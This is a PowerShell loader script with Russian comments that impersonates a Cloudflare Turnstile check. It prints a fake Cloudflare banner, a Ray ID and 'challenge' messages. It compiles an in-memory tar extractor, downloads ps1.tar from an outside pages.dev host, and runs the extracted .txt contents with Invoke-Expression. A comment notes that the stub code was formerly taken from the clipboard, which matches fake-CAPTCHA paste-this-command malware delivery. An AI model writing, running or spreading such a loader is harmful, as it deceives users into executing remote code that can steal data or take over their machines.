<#
.SYNOPSIS
    Полный самодостаточный загрузчик-скрипт,
    который сначала компилирует TarExtractor,
    потом выполняет встроенный стаб и грузит плагин из ps1.tar.
#>

# -------------------------------
# 1) Компилируем TarExtractor в память
# -------------------------------
if (-not ([AppDomain]::CurrentDomain.GetAssemblies() |
          ForEach-Object { $_.GetTypes() } |
          Where-Object { $_.FullName -eq 'TarExtractor' })) {

    $tarExtractorCode = @"
using System;
using System.IO;
using System.Collections.Generic;

public class TarExtractor
{
    public static Dictionary<string, byte[]> ExtractTarFromMemory(byte[] tarData)
    {
        var extractedFiles = new Dictionary<string, byte[]>();
        using (var ms = new MemoryStream(tarData))
        {
            while (ms.Position < ms.Length)
            {
                var header = new byte[512];
                ms.Read(header, 0, 512);

                var name = System.Text.Encoding.ASCII.GetString(header, 0, 100).Trim('\0');
                if (string.IsNullOrEmpty(name)) break;

                var sizeOctal = System.Text.Encoding.ASCII.GetString(header, 124, 12).Trim('\0').Trim();
                var size = Convert.ToInt64(sizeOctal, 8);

                var data = new byte[size];
                ms.Read(data, 0, data.Length);

                extractedFiles[name] = data;

                var pad = 512 - (ms.Position % 512);
                if (pad < 512) { ms.Seek(pad, 'Current'); }
            }
        }
        return extractedFiles;
    }
}
"@

    Add-Type -TypeDefinition $tarExtractorCode -Language CSharp
}

# -------------------------------
# 2) Выполняем встроенный стаб
#    (тот код, который раньше вы брали из буфера)
# -------------------------------
$stub = @'
echo "
  ____ _                 _  __ _                
 / ___| | ___  _   _  __| |/ _| | __ _ _ __ ___ 
| |   | |/ _ \| | | |/ _` | |_| |/ _` | '__/ _ \
| |___| | (_) | |_| | (_| |  _| | (_| | | |  __/
 \____|_|\___/ \__,_|\__,_|_| |_|\__,_|_|  \___|
 ";
Write-Host "Ray ID: b068ea8aebd976e9"
Write-Host "Running Turnstile challenge, this won't take long..."
# …и сюда вставить весь остальной код стаба, который раньше был в буфере
'@

try {
    Invoke-Expression $stub
} catch {
    Write-Error "Не удалось выполнить стаб: $_"
    exit 1
}

# -------------------------------
# 3) Скачиваем и распаковываем ps1.tar
# -------------------------------
$tarUrl = "https://gateway1.pages.dev/ps1.tar"
$wc     = New-Object System.Net.WebClient

try {
    $tarData = $wc.DownloadData($tarUrl)
} catch {
    Write-Error "Не удалось загрузить $tarUrl : $_"
    exit 1
}

$files = [TarExtractor]::ExtractTarFromMemory($tarData)
foreach ($name in $files.Keys) {
    if ($name -match '\.txt$') {
        Write-Host "Challenge completed. Just a moment..."
        $code = [System.Text.Encoding]::UTF8.GetString($files[$name])
        Invoke-Expression $code
    }
}

# -------------------------------
# 4) Финальный вывод
# -------------------------------
Write-Host "Done"
Write-Host "Ray ID: b068ea8aebd976e9"
